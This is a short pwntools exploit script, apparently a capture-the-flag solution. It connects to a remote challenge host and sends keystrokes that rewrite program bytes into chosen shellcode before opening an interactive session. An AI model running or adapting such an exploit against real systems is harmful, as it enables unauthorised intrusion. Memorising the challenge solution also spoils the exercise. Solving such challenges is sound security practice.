from pwn import *
from time import sleep
# elf = ELF("")
# context.log_level = "debug"
context.arch = 'x86_64'
# utils
# r = process("./run.sh", shell=True)
r = remote("13.201.224.182", 30392)


def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def up(): return s(b'\x1b[A')
def down(): return s(b'\x1b[B')
def enter(): return s(b'\n')
sleep(2)
# pause()
# for i in range(12):
#     # decrement the \x7d by 1 every time
#     s((0x7d-i).to_bytes(1,"little"))
#     up()
shellcode = "ee03f8baac7dc6be"
bytecode = "8ec08ed88ec031fa"

sc_bytes = [int(shellcode[i:i+2], 16) for i in range(0, len(shellcode), 2)]
print(sc_bytes)
bin_bytes = [int(bytecode[i:i+2], 16) for i in range(0, len(bytecode), 2)]
print(bin_bytes)
j = 7
for i in range(8):
    if sc_bytes[j] < bin_bytes[j]:
        for k in range(bin_bytes[j] - sc_bytes[j]):
            print(bin_bytes[j] - sc_bytes[j], k)
            sleep(0.07)
            s((0x35+i).to_bytes(1,"little"))
            sleep(0.07)
            down()
    elif sc_bytes[j] > bin_bytes[j]:
        for k in range(sc_bytes[j] - bin_bytes[j]):
            print(sc_bytes[j] - bin_bytes[j], k)
            sleep(0.07)
            s((0x35+i).to_bytes(1,"little"))
            sleep(0.07)
            up()
    j -= 1

sleep(3)
for p in range(0x27):
    sleep(0.07)
    print(p)
    s((0x48).to_bytes(1,"little"))
    sleep(0.07)
    down()

s((0x1b).to_bytes(1,"little"))

for i in range(57):
    sleep(0.07)
    s((0x35+1).to_bytes(1,"little"))
    sleep(0.07)
    up()
    sleep(0.07)
    s((0x1b).to_bytes(1,"little"))
    sleep(0.07)
r.interactive()
